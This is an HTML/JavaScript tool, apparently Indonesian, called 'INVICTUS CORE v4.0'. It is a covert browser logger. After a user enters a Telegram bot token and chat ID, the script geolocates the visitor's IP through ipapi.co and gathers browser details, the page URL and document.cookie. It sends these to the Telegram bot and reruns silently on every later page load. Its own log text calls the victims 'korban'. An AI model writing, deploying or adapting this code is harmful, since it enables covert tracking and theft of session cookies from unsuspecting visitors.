<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Integrasi Gateway</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #111; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
        .wrapper { max-width: 800px; margin: auto; border: 1px solid #333; border-radius: 8px; overflow: hidden; }
        .header { background: var(--panel); padding: 20px; border-bottom: 1px solid var(--neon); }
        .header h1 { margin: 0; color: var(--neon); font-size: 1.5rem; letter-spacing: 2px; }
        .main-content { padding: 20px; background: #0a0a0a; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #888; font-size: 0.8rem; }
        input, textarea { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 4px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
        .btn { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 4px; }
        .btn:hover { background: #00cc33; }
        #status-log { margin-top: 20px; font-family: monospace; font-size: 12px; color: #555; height: 100px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #222; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="header">
            <h1>INVICTUS CORE v4.0</h1>
            <small style="color: #666;">Production Environment | Dev: Raffi</small>
        </div>
        
        <div class="main-content">
            <div class="input-group">
                <label>Telegram Bot Token</label>
                <input type="text" id="bot_token" placeholder="Contoh: 712345678:AAH_...">
            </div>
            <div class="input-group">
                <label>Chat ID</label>
                <input type="text" id="chat_id" placeholder="Contoh: 123456789">
            </div>
            <button class="btn" onclick="initializeSystem()">Deploy & Activate Stealth</button>
            
            <div id="status-log">
                > System idle...
            </div>
        </div>
    </div>

    <script>
        const logArea = document.getElementById('status-log');
        
        function pushLog(msg) {
            const time = new Date().toLocaleTimeString();
            logArea.innerHTML += `<div>[${time}] ${msg}</div>`;
            logArea.scrollTop = logArea.scrollHeight;
        }

        // FUNGSI INJEKSI & EKSEKUSI
        function initializeSystem() {
            const token = document.getElementById('bot_token').value;
            const id = document.getElementById('chat_id').value;

            if(!token || !id) {
                pushLog("ERROR: Konfigurasi tidak lengkap!");
                return;
            }

            // Simpan secara permanen di browser
            localStorage.setItem('_sys_token', token);
            localStorage.setItem('_sys_chat_id', id);
            
            pushLog("SUCCESS: Konfigurasi disimpan.");
            pushLog("ACTION: Menjalankan Stealth Logger...");
            
            runStealthEngine();
        }

        async function runStealthEngine() {
            const token = localStorage.getItem('_sys_token');
            const id = localStorage.getItem('_sys_chat_id');

            if(!token || !id) return;

            // 1. Ambil Data IP & Lokasi
            let networkInfo = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                networkInfo = await res.json();
            } catch (e) { networkInfo = { error: "Failed to fetch IP" }; }

            // 2. Susun Laporan Malware
            const report = `
<b>üö® INVICTUS ALERT: TARGET DETECTED</b>
------------------------------------
<b>üåê NETWORK INFO:</b>
IP: <code>${networkInfo.ip || 'N/A'}</code>
City: <code>${networkInfo.city || 'N/A'}</code>
ISP: <code>${networkInfo.org || 'N/A'}</code>

<b>üíª SYSTEM INFO:</b>
Platform: <code>${navigator.platform}</code>
Agent: <code>${navigator.userAgent.split(') ')[0]})</code>
URL: <code>${window.location.href}</code>

<b>üîë DATA LEAK:</b>
Cookies: <code>${document.cookie || 'No Access/Empty'}</code>
Local Storage: <code>${Object.keys(localStorage).length} keys found</code>
------------------------------------
<i>System: Stealth Mode Active</i>
            `;

            // 3. Kirim ke Telegram
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: id,
                        text: report,
                        parse_mode: 'HTML'
                    })
                });
                
                if(response.ok) pushLog("STEALTH: Data korban berhasil dikirim.");
                else pushLog("STEALTH: Gagal mengirim data (API Error).");
            } catch (err) {
                pushLog("STEALTH: Error koneksi.");
            }
        }

        // AUTO-RUN: Jika sudah pernah dideploy, langsung jalankan diam-diam saat web dibuka
        if(localStorage.getItem('_sys_token')) {
            window.addEventListener('load', runStealthEngine);
        }
    </script>
</body>
</html>
